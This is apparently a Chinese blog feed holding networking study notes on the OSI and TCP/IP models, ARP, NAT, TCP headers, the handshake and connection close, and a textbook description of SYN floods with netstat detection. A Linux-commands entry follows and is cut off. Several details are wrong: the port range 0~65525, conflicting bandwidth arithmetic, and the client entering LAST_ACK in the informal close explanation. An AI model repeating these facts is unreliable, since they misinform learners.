      <url>/2024/05/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="1-概述"><a href="#1-概述" class="headerlink" title="1 概述"></a>1 概述</h1><p>计算机网络是指将地理位置不同的具有独立功能的多台计算机及其外部设备，通过通信线路连接起来，在网络操作系统，网络管理软件及网络通信协议的管理和协调下，实现资源共享和信息传递的计算机系统</p><p>衡量计算机网络的主要指标:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">带宽　　描述在一定时间范围内能够从一个节点传送到另一个节点的数据量,通常以bps为单位,例如家用网络带宽为500Mbps</span><br><span class="line">延迟　　描述网络上数据从一个节点传送到另一个节点所经历的时间</span><br></pre></td></tr></table></figure><p>网络模型一般是指OSI七层参考模型和TCP&#x2F;IP四层参考模型。四层模型比七层模型更常用。</p><p>OSI是国际组织提出，TCP&#x2F;IP是美国提出。</p><h1 id="2-OSI七层模型"><a href="#2-OSI七层模型" class="headerlink" title="2 OSI七层模型"></a>2 OSI七层模型</h1><p>开放系统互连参考模型 (Open System Interconnect 简称OSI）是国际标准化组织(ISO)和国际电报电话咨询委员会(CCITT)联合制定的开放系统互连参考模型，为开放式互连信息系统提供了一种功能结构的框架。</p><p>它从低到高分别是：物理层、数据链路层、网络层、传输层、会话层、表示层和应用层。</p><p><img src="/img/20230206212802.png"></p><p>网络数据包的封装与解封装类似于快递物品，每一层接收到数据后会进行特定类型的打包。</p><p><img src="/img/20230206212833.png"></p><p><strong>物理层</strong>: 建立和维护用于传输和接受二进制信息的物理链路</p><p>物理层是OSI分层结构体系中最重要、最基础的一层，它建立在传输媒介基础上，起建立、维护和取消物理连接作用，实现设备之间的物理接口。 • 物理层之接收和发送一串比特(bit)流，不考虑信息的意义和信息结构。 • 物理层包括对连接到网络上的设备描述其各种机械的、电气的、功能的规定。</p><p>物理层要形成适合数据传输需要的实体，为数据传送服务： 一、保证数据按位传输的正确性； 二、向数据链路层提供一个透明的位传输； 三、提供足够的带宽(带宽是指每秒钟内能通过的比特(BIT)数)，以减少信道上的拥塞。 传输数据的方式能满足点到点，一点到多点，串行或并行，半双工或全双工，同步或异步传输的需要。 完成物理层的一些管理工作，如在数据终端设备、数据通信和交换设备等设备之间完成对数据链路的建立、保持和拆除操作。 物理层的典型设备：<strong>光纤、同轴电缆、双绞线、中继器和集线器</strong></p><p><strong>数据链路层</strong>：为物理链路提供可靠的数据传输，包括错误的检测和修正（<strong>跟MAC地址挂钩</strong>）</p><p>链路层的主要功能： 链路层的功能是实现系统实体间二进制信息块的正确传输 。 为网络层提供可靠无错误的数据信息 在数据链路中解决信息模式、操作模式、差错控制、流量控制、信息交换过程和通信控制规程的问题链路层是为网络层提供数据传送服务的，这种服务要依靠本层具备的功能来实现。 链路层应具备如下功能： 链路连接的建立，拆除，分离。 帧定界和帧同步。 链路层的数据传输单元是帧，协议不同，帧的长短和界面也有差别，但无论如何必须对帧进行定界。 数据链路层的典型设备：<strong>二层交换机、网桥、网卡</strong></p><p><strong>网络层:</strong> 提供网络中的数据包寻址和传输服务</p><p>网络层的主要功能：介于运输层和数据链路层之间。它在数据链路层提供的两个相邻端点之间的数据帧的传送功能上，进一步管理网络中的数据通信、将数据设法从源端经过若干个中间节点传送到目的端，从而向运输层提供最基本的端到端的数据传送服务。目的是实现两个端系统之间的数据透明传送，具体功能包括寻址和路由选择、连接的建立、保持和终止等。网络层的主要功能包括：建立和拆除网络连接、路径选择和中继、网络连接多路复用、分段和组块、服务选择和传输和流量控制。 网络层的典型设备：<strong>路由器</strong></p><p>路由协议：RIP（适用于小型网络），OSPF（适用于中型网络），BGP（适用于大型网络）。</p><p><strong>传输层</strong>: 为端点之间提供透明的、可靠的数据传输、端到端错误修复、流量控制</p><p>传输层提供了主机应用程序进程之间的端到端的服务，基本功能如下： (1) 分割与重组数据 (2) 按端口号寻址 (3) 连接管理 (4) 差错控制和流量控制,纠错的功能 传输层要向会话层提供通信服务的可靠性，避免报文的出错、丢失、延迟时间紊乱、重复、乱序等差错。</p><p><strong>会话层</strong>:控制计算机之间的会话</p><p>会话层（SESSION LAYER）允许不同机器上的用户之间建立会话关系。会话层循序进行类似的传输层的普通数据的传送，在某些场合还提供了一些有用的增强型服务。允许用户利用一次会话在远端的分时系统上登陆，或者在两台机器间传递文件。 会话层提供的服务之一是管理对话控制。会话层允许信息同时双向传输，或任一时刻只能单向传输。如果属于后者，类似于物理信道上的半双工模式，会话层将记录此时该轮到哪一方。一种与对话控制有关的服务是令牌管理（token management）。有些协议会保证双方不能同时进行同样的操作，这一点很重要。为了管理这些活动，会话层提供了令牌，令牌可以在会话双方之间移动，只有持有令牌的一方可以执行某种关键性操作。另一种会话层服务是同步。如果在平均每小时出现一次大故障的网络上，两台机器简要进行一次两小时的文件传输，试想会出现什么样的情况呢？每一次传输中途失败后，都不得不重新传送这个文件。当网络再次出现大故障时，可能又会半途而废。为解决这个问题，会话层提供了一种方法，即在数据中插入同步点。每次网络出现故障后，仅仅重传最后一个同步点以后的数据（这个其实就是断点下载的原理）</p><p><strong>表示层</strong>:提供数据转换服务，如加密、压缩、格式化</p><p>表示层为在应用过程之间传送的信息提供表示方法的服务，它只关心信息发出的语法和语义。</p><p>表示层为应用层提供的服务有三项内容</p><p>语法转换：语法转换涉及代码转换和字符集的转换，数据格式的修改、数据结构操作的适配、数据压缩、数据加密等。</p><p>语法选择：语法选择是提供初始选择的一种语法和随后修改这种选择的手段。</p><p>联接管理：利用会话层提供的服务建立表示联接，管理在这一联接之上的数据运输和同步控制，以及正常或非正常地终止联接。</p><p><strong>应用层</strong>:协助应用程序与网络通讯</p><p>应用层直接和应用程序接口并提供常见的网络应用服务。应用层也向表示层发出请求。应用层是开放系统的最高层,是直接为应用进程提供服务的。其作用是在实现多个系统应用进程相互通信的同时,完成一系列业务处理所需的服务.其服务元素分为两类:公共应用服务元素CASE和特定应用服务元素SASE. CASE提供最基本的服务,它成为应用层中任何用户和任何服务元素的用户，主要为应用进程通信,分布系统实现提供基本的控制机制；特定服务SASE则要满足一些特定服务,如文卷传送,访问管理,作业传送,银行事务,订单输入等。这些将涉及到虚拟终端,作业传送与操作,文卷传送及访问管理,远程数据库访问,图形核心系统,开放系统互连管理等等。</p><h1 id="3-TCP-IP四层模型"><a href="#3-TCP-IP四层模型" class="headerlink" title="3 TCP&#x2F;IP四层模型"></a>3 TCP&#x2F;IP四层模型</h1><p>TCP&#x2F;IP模型与OSI参考模型有些类似，将OSI中的会话层、表示层去掉，并将数据链路层和物理层合并成网络接口层，TCP&#x2F;IP支持所有标准的数据链路层和物理层协议。</p><p><img src="/img/image-20240601231848889.png" alt="image-20240601231848889"></p><p>TCP&#x2F;IP模型中每一层的功能如下图：</p><p><img src="/img/image-20240601231930378.png" alt="image-20240601231930378"></p><p>OSI七层模型与TCP&#x2F;IP模型，所对应的功能与之哪些协议工作的大致清单可参考下图：</p><p><img src="/img/image-20240601233757020.png" alt="image-20240601233757020"></p><h1 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h1><p>地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP&#x2F;IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。</p><p>地址解析协议是建立在网络中各个主机互相信任的基础上的，网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时不会检测该报文的真实性就会将其记入本机ARP缓存；由此攻击者就可以向某一主机发送伪ARP应答报文，使其发送的信息无法到达预期的主机或到达错误的主机，这就构成了一个ARP欺骗。</p><p>ARP命令可用于查询本机ARP缓存中IP地址和MAC地址的对应关系、添加或删除静态对应关系等。</p><p>相关协议有RARP、代理ARP。NDP用于在IPv6中代替地址解析协议。</p><p>工作过程<br>主机A的IP地址为192.168.1.1，MAC地址为0A-11-22-33-44-01；<br>主机B的IP地址为192.168.1.2，MAC地址为0A-11-22-33-44-02；<br>当主机A要与主机B通信时，地址解析协议可以将主机B的IP地址（192.168.1.2）解析成主机B的MAC地址，以下为工作流程：<br>第1步：根据主机A上的路由表内容，IP确定用于访问主机B的转发IP地址是192.168.1.2。然后A主机在自己的本地ARP缓存中检查主机B的匹配MAC地址。<br>第2步：如果主机A在ARP缓存中没有找到映射，它将询问192.168.1.2的硬件地址，从而将ARP请求帧广播到本地网络上的所有主机。源主机A的IP地址和MAC地址都包括在ARP请求中。本地网络上的每台主机都接收到ARP请求并且检查是否与自己的IP地址匹配。如果主机发现请求的IP地址与自己的IP地址不匹配，它将丢弃ARP请求。<br>第3步：主机B确定ARP请求中的IP地址与自己的IP地址匹配，则将主机A的IP地址和MAC地址映射添加到本地ARP缓存中。<br>第4步：主机B将包含其MAC地址的ARP回复消息直接发送回主机A。<br>第5步：当主机A收到从主机B发来的ARP回复消息时，会用主机B的IP和MAC地址映射更新ARP缓存。本机缓存是有生存期的，生存期结束后，将再次重复上面的过程。主机B的MAC地址一旦确定，主机A就能向主机B发送IP通信了。</p><p>ARP缓存中包含一个或多个表，它们用于存储IP地址及其经过解析的MAC地址。<br>ARP命令用于查询本机ARP缓存中IP地址–&gt;MAC地址的对应关系、添加或删除静态对应关系等。<br>如果在没有参数的情况下使用，ARP命令将显示帮助信息。<br>ARP命令常见用法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp -a或arp –g</span><br><span class="line">用于查看缓存中的所有项目。</span><br><span class="line">arp -a Ip</span><br><span class="line">如果有多个网卡，那么使用arp -a加上接口的IP地址，就可以只显示与该接口相关的ARP缓存项目。</span><br><span class="line">arp -s Ip 物理地址</span><br><span class="line">可以向ARP缓存中人工输入一个静态项目。</span><br><span class="line">arp -d Ip</span><br><span class="line">使用该命令能够人工删除一个静态项目。</span><br></pre></td></tr></table></figure><h1 id="NAT协议"><a href="#NAT协议" class="headerlink" title="NAT协议"></a>NAT协议</h1><p>NAT英文全称是“Network Address Translation”，中文意思是“网络地址转换”，允许一个整体机构以一个公用IP（Internet Protocol）地址出现在Internet上。顾名思义，它是一种把内部私有网络地址（IP地址）翻译成合法网络IP地址的技术。</p><p>NAT功能通常被集成到路由器、防火墙、ISDN路由器或者单独的NAT设备中，NAT技术类型 NAT有三种类型：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.静态NAT(Static NAT)</span><br><span class="line">2.动态地址NAT(Pooled NAT)</span><br><span class="line">3.网络地址端口转换NAPT（Port－Level NAT）</span><br></pre></td></tr></table></figure><h1 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h1><p>Internet控制消息协议。</p><p>它是TCP&#x2F;IP协议族的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。</p><p>我们经常使用的Ping及traceroute（Windows中为tracert）基于ICMP协议。</p><h1 id="TCP与UDP协议"><a href="#TCP与UDP协议" class="headerlink" title="TCP与UDP协议"></a>TCP与UDP协议</h1><p><strong>TCP</strong>是面向连接的可靠的传输层协议，它支持在不可靠网络上实现面向连接的可靠的数据传输<br>TCP的特点：       三次握手        建立可靠的连接<br>                              确认机制        应答接受<br>                              端口号           多路复用<br>                              完整性校验    差错检测<br>                              序列号           丢失检测、乱序重拍<br>                              窗口机制       流量控制</p><p><strong>UDP</strong>是一种无连接的传输层协议，它主要用于不要求分组顺序到达的传输中，分组传输顺序的检查与排序由应用层完成 ，提供面向事务的简单不可靠信息传送服务。<br>UDP特点：<br>UDP是无连接的  传输数据前并不与对方建立连接<br>UDP不对收到的数据进行排序<br>UDP对接收到的数据报不发送确认，发送端也不会重发数据<br>UDP传输数据较TCP快速，开销也少<br>UDP缺乏拥塞控制机制</p><p><img src="/img/image-20240602145750695.png" alt="image-20240602145750695"></p><h2 id="TCP报文格式"><a href="#TCP报文格式" class="headerlink" title="TCP报文格式"></a>TCP报文格式</h2><p><img src="/img/image-20240602153948123.png" alt="image-20240602153948123"></p><p><strong>数据单位</strong></p><p>32位即为32bit（比特位），等于4字节（ 4Byte 简写 4B）。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8bit=1B（Byte 字节）</span><br><span class="line">1024B=1KB （Kilobyte 千字节）</span><br><span class="line">1024KB=1MB（Mega byte 兆字节）</span><br><span class="line">1024MB=1GB（Giga byte 吉字节 又称千兆）</span><br><span class="line">1024GB=1TB（Tera byte 万亿字节 又称太字节）</span><br><span class="line">其中1024=2^10 ( 2 的10次方)</span><br><span class="line"></span><br><span class="line">网络带宽与网速，为什么除以8？</span><br><span class="line">运营商是以bit为单位，且以千进位计算。</span><br><span class="line">比如百兆宽带：</span><br><span class="line">100Mbs</span><br><span class="line">=100*1000b/s</span><br><span class="line">=(100000/8)B/s</span><br><span class="line">=12500B/s</span><br><span class="line">=12.5MB/s</span><br><span class="line">而计算机中没有Mb一说，因为计算机b与B只差8倍，1000b在计算机中不存在单位换算。</span><br></pre></td></tr></table></figure><p><strong>IP首部</strong>，包含源 IP 和目的 IP。<br>源IP：就是发送方的IP地址。<br>目的IP：就是接收方的IP地址。</p><p><strong>源端口号</strong>（16位）：发送方主机的应用程序的端口号，范围0~65525。</p><p><strong>目的端口号</strong>（16位）：目的主机的应用程序的端口号，范围0~65525。</p><p><strong>序号</strong>（32位）：英文sequence number，TCP 报文段的每一个字节都有一个编号，此序号表示本报文段所发送数据的第一个字节的编号，在建立连接时由计算机随机生成，每发送一次数据，该序号+1，用来解决网络中包乱序的问题。</p><p><strong>确认号</strong>（32位）：英文acknoledgement number，期望收到对方的下一个TCP报文段第一个字节的编号，即对方下一个序号。</p><p><strong>数据偏移</strong>（4位）：又称首部长度，是指报文中的“数据”部分起始处距离TCP报文段起始处的有多远（即TCP报文头长度）。确定TCP报文的报头部分长度，告诉接收端应用程序，数据(有效载荷)从何处开始。</p><p><strong>保留字段</strong>（6位）：为TCP将来的发展预留空间，目前必须全部为0 。</p><p><strong>标志位字段</strong>：共有6个标志位，每个标志位占1个bit（0或1）。</p><ul><li><strong>URG</strong>：紧急比特，当 URG&#x3D;1 时，表明紧急指针字段有效。表示此报文段中有紧急数据，应尽快传送（相当于高优先级的数据）。</li><li><strong>ACK</strong>：确认比特，当 ACK&#x3D;1时，确认号字段有效。当 ACK&#x3D;0 时，确认号无效。</li><li><strong>PSH</strong>：推送比特，接收方 TCP 收到 PSH&#x3D;1的报文段，就尽快地交付给接收应用进程，而不再等到整个缓存都填满了后再向上交付。</li><li><strong>RST</strong>：复位比特，当RST&#x3D;1时，表示TCP连接中出现严重差错(如由于主机崩溃或其他原因)，强制断开连接。</li><li><strong>SYN</strong>：同步比特，SYN 置为 1，就表示这是一个连接请求或连接接受报文。</li><li><strong>FIN</strong>：终止比特，用来释放一个连接。当FIN&#x3D;1 时，表明此报文段的发送端的数据已发送完毕，并要求释放运输连接。</li></ul><p><strong>窗口大小</strong>（16位）：窗口字段用来控制对方发送的数据量，单位为字节。TCP 连接的一端根据设置的缓存空间大小确定自己的接收窗口大小，然后通知对方接收窗口<strong>还可以接受多少字节的数据量</strong>，以确定对方的发送窗口的上限，该字段用于TCP的流量控制。</p><p><strong>检验和</strong>（16位）：用于确认传输的数据有无损坏 。发送端基于数据内容校验生成一个数值，接收端根据接受的数据校验生成一个值。两个值相同代表数据有效，反之无效，丢弃该数据包。校验和根据 伪报头 + TCP头 + TCP数据 三部分进行计算。</p><p><strong>紧急指针</strong>（16位）：仅当标志位字段的URG标志位为1时才有意义。指出有效载荷中为紧急数据的字节数。当所有紧急数据处理完后，TCP就会告诉应用程序恢复到正常操作。即使接收方窗口大小为0，也可以发送紧急数据，因为紧急数据无须缓存。</p><p><strong>选项字段</strong>：长度不定，但长度必须是<strong>32bits的整数倍</strong>。内容可变，因此必须使用首部长度来区分选项的具体长度，TCP首部可以有多达40字节的可选信息，用于把附加信息传递给终点，或用来对齐其它选项。 这部分最多包含40字节，因为TCP头部最长是60字节（其中还包含前面讨论的20字节的固定部分）。</p><h2 id="TCP协议三次握手"><a href="#TCP协议三次握手" class="headerlink" title="TCP协议三次握手"></a>TCP协议三次握手</h2><p><img src="/img/image-20240602173924546.png" alt="image-20240602173924546"></p><p>​三次握手(Three-way Handshake)，是指建立一个 TCP 连接时，需要客户端和服务器总共发送3个包。进行三次握手的目的是为了确认客户端和服务端双方的的发送能力和接收能力是否正常，、指定自己的初始化序列号为后面的可靠性传送做准备。实质上其实就是连接服务器指定端口，建立TCP连接，并同步连接双方的序列号和确认号，交换<code>TCP窗口大小</code>信息。</p><p>刚开始客户端处于 Closed 的状态，服务端处于 Listen 状态。</p><p><strong>第一次握手</strong></p><p>​客户端发送一个 TCP 的 SYN&#x3D;1的报文，请求连接服务器，并指明初始序号（也称ISN，英文Initial Sequence Number） seq&#x3D;x。发送完毕后，客户端进入 SYN_SEND 状态。SYN&#x3D;1的报文段不能携带数据，但要消耗掉一个序号。</p><p><strong>第二次握手</strong></p><p>​服务器收到客户端的 SYN 报文之后，会以自己的 SYN 报文作为应答，并且也是指定了自己的初始化序列号（也称ISN，英文Initial Sequence Number） seq&#x3D;y，同时会把客户端的 seq 加 1 作为ack的值，表示自己已经收到了客户端的 SYN，发送完成后服务端进入SYN_RCVD状态。</p><p><strong>第三次握手</strong></p><p>​客户端收到 SYN 报文之后，把服务端的seq加1作为 ack 的值应答，自己的seq序号&#x3D;x+1（初始为seq&#x3D;x，第二个报文段所以要+1）。客户端发送完毕后，进入ESTABLISHED状态，服务端接收到这个包，也进入ESTABLISHED状态, TCP握手结束。ACK报文段可以携带数据，不携带数据则不消耗序号。</p><p><strong>ISN(Initial Sequence Number)是固定的吗？</strong></p><p>​当一端为建立连接而发送它的SYN时，它为连接选择一个初始序号。ISN随时间而变化，因此每个连接都将具有不同的ISN。ISN可以看作是一个32比特的计数器，每4ms加1 。这样选择序号的目的在于防止在网络中被延迟的分组在以后又被传送，而导致某个连接的一方对它做错误的解释。</p><p>　　三次握手的其中一个重要功能是客户端和服务端交换 ISN(Initial Sequence Number)，以便让对方知道接下来接收数据的时候如何按序列号组装数据。如果 ISN 是固定的，攻击者很容易猜出后续的确认号，因此 ISN 是动态生成的。</p><h3 id="SYN攻击"><a href="#SYN攻击" class="headerlink" title="SYN攻击"></a>SYN攻击</h3><p><strong>服务器端的资源分配是在二次握手时分配的，而客户端的资源是在完成三次握手时分配的</strong>，所以服务器容易受到SYN洪泛攻击。SYN攻击就是Client在短时间内伪造大量不存在的IP地址，并向Server不断地发送SYN包，Server则回复确认包，并等待Client确认，由于源地址不存在，因此Server需要不断重发直至超时，这些伪造的SYN包将长时间占用未连接队列，导致正常的SYN请求因为队列满而被丢弃，从而引起网络拥塞甚至系统瘫痪。SYN 攻击是一种典型的 DoS&#x2F;DDoS 攻击。</p><p>检测 SYN 攻击非常的方便，当你在服务器上看到大量的半连接状态时，特别是源IP地址是随机的，基本上可以断定这是一次SYN攻击。在 Linux&#x2F;Unix 上可以使用系统自带的 netstat 命令来检测 SYN 攻击。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -n -p TCP | grep SYN_RECV</span><br></pre></td></tr></table></figure><p>常见的防御 SYN 攻击的方法有如下几种：</p><ul><li>缩短超时（SYN Timeout）时间</li><li>增加最大半连接数</li><li>过滤网关防护</li><li>SYN cookies技术</li></ul><h3 id="用Wireshark看TCP三次握手"><a href="#用Wireshark看TCP三次握手" class="headerlink" title="用Wireshark看TCP三次握手"></a>用Wireshark看TCP三次握手</h3><p>打开Windows Server 2012（已安装IIS），查看IP是多少。</p><p><img src="/img/20220616111649.png"></p><p>打开kali的Wireshark软件。</p><p><img src="/img/20220616112057.png"></p><p><img src="/img/20220616112244.png"></p><p>在kali使用<code>nc</code>命令监听Windows Server 2012 的80端口。</p><p><code>nc</code>是<code>netcat</code>的简写，是一个功能强大的网络工具，有着网络界的瑞士军刀美誉。<code>nc</code>命令在<code>linux</code>系统中实际命令是<code>ncat</code>，<code>nc</code>是软连接到<code>ncat</code>。<code>nc</code>命令的主要作用如下：</p><ul><li>实现任意TCP&#x2F;UDP端口的侦听，<code>nc</code>可以作为server以TCP或UDP方式侦听指定端口。</li><li>端口的扫描，<code>nc</code>可以作为client发起TCP或UDP连接。</li><li>机器之间传输文件。</li><li>机器之间网络测速。</li></ul><p><img src="/img/20220616112846.png"></p><p>Source是源地址，Destination是目标地址，Protocol是协议。</p><p>点击Protocol会根据Protocol排序。</p><p><img src="/img/20220616113857.png"></p><p>我们可以看到192.168.1.5是kali的IP，发起了第一次握手，发送[SYN]请求，kali的Seq序列号为0；</p><p>Windows Server 2012返回[SYN, ACK]包，响应并返回一个请求给kali，Windows Server 2012的Seq&#x3D;0，ACK&#x3D;kali的Seq+1&#x3D;1;</p><p>kali收到返回包，再次发出确认，发出[ACK]，ACK&#x3D;Windows Server 2012的Seq+1&#x3D;1。</p><h2 id="TCP协议四次挥手"><a href="#TCP协议四次挥手" class="headerlink" title="TCP协议四次挥手"></a>TCP协议四次挥手</h2><p><img src="/img/image-20240602191121488.png" alt="image-20240602191121488"></p><p>建立一个连接需要三次握手，而终止一个连接要经过四次挥手（也有将四次挥手叫做四次握手的）。这由TCP的半关闭（half-close）造成的。所谓的半关闭，其实就是TCP提供了连接的一端在结束它的发送后还能接收来自另一端数据的能力。</p><p>TCP 连接的拆除需要发送四个包，因此称为四次挥手(Four-way handshake)，客户端或服务端均可主动发起挥手动作。</p><p>刚开始双方都处于ESTABLISHED 状态，假如是客户端先发起关闭请求。四次挥手的过程如下：</p><p><strong>第一次挥手</strong>：客户端发送一个 FIN 报文，报文中会指定一个序列号。此时客户端处于 FIN_WAIT1 状态。</p><p>　　即发出连接释放报文段（FIN&#x3D;1，序号seq&#x3D;a），并停止再发送数据，主动关闭TCP连接，进入FIN_WAIT1（终止等待1）状态，等待服务端的确认。</p><p><strong>第二次挥手</strong>：服务端收到 FIN 之后，会发送 ACK 报文，且把客户端的序列号值 +1 作为 ACK 报文的序列号值，表明已经收到客户端的报文了，此时服务端处于 CLOSE_WAIT 状态。</p><p>　　即服务端收到连接释放报文段后即发出确认报文段（ACK&#x3D;1，确认号ack&#x3D;a+1，序号seq&#x3D;b），服务端进入CLOSE_WAIT（关闭等待）状态，此时的TCP处于半关闭状态，客户端到服务端的连接释放。客户端收到服务端的确认后，进入FIN_WAIT2（终止等待2）状态，等待服务端发出的连接释放报文段。</p><p><strong>第三次挥手</strong>：如果服务端也想断开连接了，和客户端的第一次挥手一样，发给 FIN 报文，且指定一个序列号。此时服务端处于 LAST_ACK 的状态。</p><p>　　即服务端没有要向客户端发出的数据，服务端发出连接释放报文段（FIN&#x3D;1，ACK&#x3D;1，序号seq&#x3D;c，确认号ack&#x3D;a+1），服务端进入LAST_ACK（最后确认）状态，等待客户端的确认。</p><p><strong>第四次挥手</strong>：客户端收到 FIN 之后，一样发送一个 ACK 报文作为应答，且把服务端的序列号值 +1 作为自己 ACK 报文的序列号值，此时客户端处于 TIME_WAIT 状态。需要过一阵子以确保服务端收到自己的 ACK 报文之后才会进入 CLOSED 状态，服务端收到 ACK 报文之后，就处于关闭连接了，处于 CLOSED 状态。　　</p><p>　　即客户端收到服务端的连接释放报文段后，对此发出确认报文段（ACK&#x3D;1，seq&#x3D;a+1，ack&#x3D;c+1），客户端进入TIME_WAIT（时间等待）状态。此时TCP未释放掉，需要经过时间等待计时器设置的时间2MSL后，客户端才进入CLOSED状态。</p><p><strong>收到一个FIN只意味着在这一方向上没有数据流动。客户端执行主动关闭并进入TIME_WAIT是正常的，服务端通常执行被动关闭，不会进入TIME_WAIT状态。</strong></p><p>通俗解释：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一次：客户端向服务端发送一个FIN=N,告诉服务端我已经发送完毕了想要关闭了，如果你还有想要发送的你就发吧，不急着关,然后进入FIN_WAIT_1状态。</span><br><span class="line"></span><br><span class="line">第二次：服务端收到客户端说我还想浪一会，给客户端发送ack=N+1,客户端收到后说行进入FIN_WAIT_2状态。</span><br><span class="line"></span><br><span class="line">第三次：服务端浪完以后发送一个FIN=M报文给客户端，告诉客户端我发完了你可以关闭了，客户端收到以后进入LAST_ACK状态。</span><br><span class="line"></span><br><span class="line">第四次：客户端收到服务端发的信息之后不放心网络，怕服务端不知道要关闭，发送ack=M+1给服务端，并进入TIME_WAIT状态，服务端收到ACK后就知道可以关闭了，就关闭了。客户端等待一会儿后没有收到回复，则证明服务端已经关闭，客户端也就关闭了。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux常用命令</title>
      <link href="/2024/05/11/linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2024/05/11/linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="1-系统相关"><a href="#1-系统相关" class="headerlink" title="1.系统相关"></a>1.系统相关</h1><p><code>date</code> 显示系统日期。</p><h2 id="1-1运行级别"><a href="#1-1运行级别" class="headerlink" title="1.1运行级别"></a>1.1运行级别</h2><p>所谓运行级别，简单点来说，运行级别就是操作系统当前正在运行的功能级别。级别是从0到6，具有不同的功能。</p><p>1和2都是系统坏了，非正常状态。</p><p>Linux下的7个运行级别：</p><ul><li><p>0:系统停机状态，系统默认运行级别不能设置为0，否则不能正常启动，机器关闭。</p></li><li><p>1:单用户工作状态，root权限，用于系统维护，禁止远程登陆，就像Windows下的安全模式登录。</p></li><li><p>2:多用户状态，没有NFS支持。</p></li><li><p>3:完整的多用户模式，有NFS，登陆后进入控制台命令行模式。</p></li><li><p>4:系统未使用（这个级别留着做拓展用）。</p></li><li><p>5:X11控制台，登陆后进入图形GUI模式，XWindow系统。</p></li><li><p>6:系统正常关闭并重启，默认运行级别不能设为6，否则不能正常启动。运行init6机器就会重启。</p><p>关机&#x2F;重启命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">init 0</span><br><span class="line">init 6</span><br></pre></td></tr></table></figure></li></ul><p>init是centos7之前的主流。</p><p><strong>init进程</strong>：由 Linux 内核加载运行 &#x2F;sbin&#x2F;init 程序，是系统中第一个进程，PID(进程标记)号永远为1。</p><p><strong>Systemd进程</strong>：代替init进程，成为主流程序，位于&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;systemd。</p><p>​Systemd的优势：向下兼容，更快的启动速度，集中化命令管理，更合理的命令结构。</p><h2 id="1-2关机"><a href="#1-2关机" class="headerlink" title="1.2关机"></a>1.2关机</h2><p><code>shutdown -h now</code> 关闭系统(1)。</p><p><code>init 0</code> 关闭系统(2)。</p><p><code>telinit 0</code> 关闭系统(3)。</p><p><code>shutdown -h 小时:分钟 &amp;</code> 按预定时间关闭系统</p><p><code>shutdown -c</code> 取消按预定时间关闭系统</p><h2 id="1-3重启"><a href="#1-3重启" class="headerlink" title="1.3重启"></a>1.3重启</h2><p><code>shutdown -r now</code> 重启(1)。</p><p><code>reboot</code> 重启(2)。</p><p><code>init 6</code> 重启(3)。</p><h2 id="1-4开机自启"><a href="#1-4开机自启" class="headerlink" title="1.4开机自启"></a>1.4开机自启</h2><p>有很多程序往往都需要设置开机自启，比如tomcat、mysql、nginx等。</p><p>在systemctl的命令中，<code>enable</code>代表开机自启，<code>disable</code>代表取消开机自启。</p><p>如想设置某服务开机自启，可使用<code>systemctl enable [服务名]</code></p><p>案例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl enable nginx</span><br></pre></td></tr></table></figure><h2 id="1-5系统管理"><a href="#1-5系统管理" class="headerlink" title="1.5系统管理"></a>1.5系统管理</h2><h3 id="1-5-1-top-命令"><a href="#1-5-1-top-命令" class="headerlink" title="1.5.1 top 命令"></a>1.5.1 top 命令</h3><p><code>top</code>可以实时动态地查看系统的整体运行情况，是一个综合了多方信息监测系统性能和运行信息的实用工具。通过top命令所提供的互动式界面，用热键可以管理。</p><p>案例：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">top <span class="comment">#按q退出，按c以cpu排序，按m以内存排序</span></span><br></pre></td></tr></table></figure><p><img src="/img/20220910201526.png"></p><p>第1行：<code>top - 19:31:16 up 21:10,  2 users,  load average: 0.00, 0.00, 0.00</code></p><table><thead><tr><th>内容</th><th>含义</th></tr></thead><tbody><tr><td>19:31:16</td><td>表示当前时间</td></tr><tr><td>up  21:10</td><td>系统运行时间 格式为时：分</td></tr><tr><td>2 users</td><td>当前登录用户数</td></tr><tr><td>load average: 0.00, 0.00, 0.00</td><td>系统负载，即任务队列的平均长度。 三个数值分别为 1分钟、5分钟、15分钟前到现在的平均值。</td></tr></tbody></table><p>第2行：<code>Tasks: 109 total,   1 running, 108 sleeping,   0 stopped,   0 zombie</code></p><p>第3行：<code>%Cpu(s):  0.0 us,  0.0 sy,  0.0 ni, 99.7 id,  0.0 wa,  0.3 hi,  0.0 si,  0.0 st</code></p><p>第2、3行为进程和CPU的信息  当有多个CPU时，这些内容可能会超过两行，其参数如下：</p><table><thead><tr><th>内容</th><th>含义</th></tr></thead><tbody><tr><td>109 total</td><td>进程总数</td></tr><tr><td>1 running</td><td>正在运行的进程数</td></tr><tr><td>108 sleeping</td><td>睡眠的进程数</td></tr><tr><td>0 stopped</td><td>停止的进程数</td></tr><tr><td>0 zombie</td><td>僵尸进程数</td></tr><tr><td>0.0 us</td><td>用户空间占用CPU百分比</td></tr><tr><td>0.0 